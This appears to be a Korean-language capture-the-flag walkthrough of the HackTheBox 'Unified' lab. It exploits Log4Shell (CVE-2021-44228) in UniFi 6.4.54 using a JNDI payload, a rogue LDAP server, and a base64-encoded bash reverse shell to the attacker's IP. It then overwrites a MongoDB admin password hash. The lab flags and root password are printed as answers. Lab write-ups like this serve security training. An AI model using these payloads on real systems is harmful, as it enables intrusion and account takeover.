# Unified

## Workstation
- Virtual Box : VMware Workstation 16 Pro
- OS : kali-linux-2022.3

## Walkthrough

* CONNECT | Connect to Starting Point VPN before starting the machine

```
sudo openvpn starting_point_<id>.ovpn
```

* Spawn Machine | Click to Spawn the machine

![machine](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/machine.png)

* Task 1 | Which are the first four open ports?

> 22,6789,8080,8443

`nmap`을 사용해 포트 스캔을 한다.

22번 ssh, 6789번 ibm db2, 8080번 http-proxy, 8443번 ssl 서버가 열려있다.

```
┌──(kali㉿kali)-[~/Unified]
└─$ sudo nmap -sC -sV 10.129.206.220
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-16 01:12 EDT
Nmap scan report for 10.129.206.220
Host is up (0.22s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Fri, 16 Sep 2022 05:13:07 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Fri, 16 Sep 2022 05:13:06 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 16 Sep 2022 05:13:07 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|     Request</h1></body></html>
|   Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Fri, 16 Sep 2022 05:13:08 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://10.129.206.220:8443/manage
|_http-open-proxy: Proxy might be redirecting requests
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24 
```

* Task 2 | What is title of the software that is running running on port 8443?

> UniFi Network

nmap 결과로 알 수 있듯이 8443번 포트의 타이틀이 같이 나와있다.

* Task 3 | What is the version of the software that is running?

> 6.4.54

열려있는 8443번 포트의 ssl 서버에 접속하기 위해 브라우저에 https로 접속한다. `https://<Machine_IP>:8443`

파이어폭스로 접속 시 경고가 뜨지만 다음과 같이 눌러 진행하면 정상적으로 접속된다.

`Advanced...` -> `Accept the Risk and Continue`

접속된 사이트에서 버전정보를 알 수 있다.

![https](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/https.png)

* Task 4 | What is the CVE for the identified vulnerability?

> CVE-2021-44228 

사이트의 취약점을 알아내기 위해 구글링한 결과 Log4j 취약점으로 확인되었다.

https://www.krcert.or.kr/data/reportView.do?bulletin_writing_sequence=36476

Log4j 취약점은 Log4j에서 구성, 로그 메시지 및 매개 변수에 사용되는 JNDI에서 발생하는 취약점이다. 공격자는 Lookup 기능을 악용하여 LDAP 서버에 로드된 임의의 코드를 실행할 수 있다.

이때 JNDI(Java Naming and Directory Interface)란 서로 다른 네이밍 및 디렉터리 서비스와 상호 작용할 수 있는 하나의 공통 인터페이스를 제공하기 위한 java 기반의 인터페이스이다.

* Task 5 | What protocol does JNDI leverage in the injection?

> LDAP

* Task 6 | What tool do we use to intercept the traffic, indicating the attack was successful?

> tcpdump

tcpdump란 패킷 가로채기를 하는 소프트웨어이다.

열심히 구글링했더니 UniFi 6.4.54의 취약점을 설명한 게시글을 찾았다.

로그인 요청할 때 `remember` 데이터 값이 Log4j에 취약하다고 되어있다.

https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

LDAP 서버를 사용하기 위해 우선 tcpdump로 패킷을 확인한다.

burpsuite를 실행해 로그인 데이터를 인터셉트하여 Log4j 취약점 코드 `"${jndi:ldap://<IP>/o=tomcat}"`를 입력한다.

![burp](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/burp.png)

패킷이 확인되었으니 UniFi 6.4.54 가 취약하다는 것이 명확해졌다.

![tcpdump](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/tcpdump.png)

* Task 7 | What port do we need to inspect intercepted traffic for?

> 389

* Task 8 | What port is the MongoDB service running on?

> 27117

이제 악성 LDAP 서버를 설치한다. openjdk-11-jre 사용을 위해 maven 모듈도 같이 설치한다.

```
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

![jndi](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/jndi.png)

위와 같이 입력하면 악성 LDAP 서버 실행 준비를 마쳤다.

이제 리버스 쉘을 전달할 명령어를 만들어야 한다. 명령어를 base64로 인코딩한다.

![base64](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/base64.png)

인코딩 값을 같이 입력하여 컴파일한다.

```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTg0LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.184"
```

![jar](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/jar.png)

이때 매핑하고 있는 ldap 서버를 잘 보면 포트 값을 1389번으로 입력해 주고 있다.

nc로 리버스 쉘 코드로 설정한 4444번 포트를 리스닝한다.

그리고 다시 한번 로그인 페이지에서 remember 값에 Log4j 취약점 코드를 입력할 때 마지막 포트를 1389로 입력하여 Forward를 누르면 리버스 쉘을 얻을 수 있다.

![1389](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/1389.png)

![shell](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/shell.png)

쉘을 보기 좋게 하기 위해 추가로 `script /dev/null -c bash` 명령어를 입력했다.

그럼 MongoDB 서비스 포트를 확인하기 위해 실행되고 있는 프로세스를 확인하면 27117 포트로 실행되고 있는 것을 알 수 있다..

![ps](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/ps.png)

* Task 9 | What is the default database name for UniFi applications?

> ace

* Task 10 | What is the function we use to enumerate users within the database in MongoDB?

> db.admin.find() 

데이터베이스의 암호 해시를 덤프한다. 다음과 같이 입력하면 사용자와 권한과 암호 해시를 덤프할 수 있다.

![admin](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/admin.png)

* Task 11 | What is the function we use to update users within the database in MongoDB?

>  db.admin.update()

x_shadow에 저장되어 있는 암호 해시 값을 해독하는 것은 너무나 오랜시간이 걸릴 것 같으니 우리는 해시 값을 업데이트할 것이다.

password의 해시 값을 준비한다.

![mkpasswd](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/mkpasswd.png)

이제 준비한 해시 값을 아래와 같이 업데이트한다.

```
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$BL3vSOTCs73fGtC9$ddJsCLyISiX21OTkEOgg5CEgT1EKCGw2TgqK6OgmvttgPj4gfv4MVldIhMQRTA9R6vwbty9kQ5vFgYppkWQ1E0"}})'
```

성공적으로 업데이트가 된 것을 다시 find로 x_shadow 부분을 확인한다.

![update](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/update.png)

* Task 12 | What is the password for the root user?

> NotACrackablePassword4U2022

이제 변경된 계정 `administrator:password`으로 로그인한다.

![login](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/login.png)

이것저것 확인하던 중 Setting 메뉴에서 ssh 계정이 노출되어 있다.

![setting](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/setting.png)

* Submit Flag | Submit user flag

> 6ced1a6a89e666c0620cdb10262ba127

ssh로 로그인하면 root 플래그와 user 플래그를 모두 확인할 수 있다.

![ssh](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/ssh.png)

![user](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/user.png)

* Submit Flag | Submit root flag 

> e50bc93c75b634e4b272d2f771c33681

![root](https://github.com/jasperkim425/Walkthrough/blob/main/HackTheBox/Starting%20Point/Unified/image/root.png)

## Reference
* Kisa Log4j 위형 대응 보고서 : https://www.krcert.or.kr/data/reportView.do?bulletin_writing_sequence=36476
* Log4j Unifi : https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi
